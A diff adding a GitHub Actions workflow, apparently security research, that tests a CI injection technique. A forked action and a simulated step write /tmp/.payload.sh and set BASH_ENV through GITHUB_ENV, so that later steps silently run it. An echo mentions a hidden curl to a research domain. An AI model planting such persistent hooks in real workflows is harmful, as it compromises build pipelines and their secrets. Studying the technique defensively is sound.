@@ -1,0 +1,67 @@
+name: Test Langchain Attack (BASH_ENV cross-step)
+on: workflow_dispatch
+
+jobs:
+  test-via-action:
+    name: "Test via forked get-changed-files action"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked action (payload is in dist/index.js line 1-2)"
+        uses: rafidhaque/get-changed-files@78e6c994cd44cf5faba1b1c93eeb2872dd1b7282
+        continue-on-error: true
+
+      - name: "Check Phase 1: payload file and BASH_ENV"
+        run: |
+          echo "=== Check if /tmp/.payload.sh was created ==="
+          if [ -f /tmp/.payload.sh ]; then
+            echo "PAYLOAD FILE EXISTS"
+            echo "=== Contents ==="
+            cat /tmp/.payload.sh
+          else
+            echo "PAYLOAD FILE NOT FOUND"
+          fi
+          echo ""
+          echo "=== Check if BASH_ENV is set ==="
+          echo "BASH_ENV=${BASH_ENV:-NOT SET}"
+
+      - name: "Check Phase 2: this step should auto-source BASH_ENV"
+        run: |
+          echo "=== If BASH_ENV worked, curl would have attempted to run before this echo ==="
+          echo "=== Check BASH_ENV value ==="
+          echo "BASH_ENV=${BASH_ENV:-NOT SET}"
+          echo "=== Check if curl tried to connect (will fail on example.com) ==="
+          echo "The curl to eaction-research.example.com would have run silently and failed (domain doesn't resolve)"
+          echo "=== Proof: run env and look for BASH_ENV ==="
+          env | grep -i bash_env || echo "BASH_ENV not in env"
+
+  test-mechanism-direct:
+    name: "Test BASH_ENV mechanism directly (no action)"
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Simulate Phase 1: create payload and set BASH_ENV"
+        run: |
+          echo 'echo "BASH_ENV_PAYLOAD_EXECUTED=true" >> $GITHUB_ENV' > /tmp/.payload.sh
+          echo "BASH_ENV=/tmp/.payload.sh" >> $GITHUB_ENV
+          echo "Wrote payload and set BASH_ENV"
+
+      - name: "Phase 2: this step should auto-source BASH_ENV"
+        run: |
+          echo "=== Did BASH_ENV payload execute? ==="
+          if [ "${BASH_ENV_PAYLOAD_EXECUTED}" = "true" ]; then
+            echo "SUCCESS: BASH_ENV was sourced — payload executed in this step"
+          else
+            echo "FAIL: BASH_ENV was NOT sourced"
+          fi
+          echo "BASH_ENV=${BASH_ENV}"
+          echo "BASH_ENV_PAYLOAD_EXECUTED=${BASH_ENV_PAYLOAD_EXECUTED:-not set}"
+
+      - name: "Phase 2b: verify it keeps executing in every subsequent step"
+        run: |
+          echo "=== Still executing? ==="
+          if [ "${BASH_ENV_PAYLOAD_EXECUTED}" = "true" ]; then
+            echo "SUCCESS: BASH_ENV still active in this step too"
+          else
+            echo "FAIL: BASH_ENV not active"
+          fi
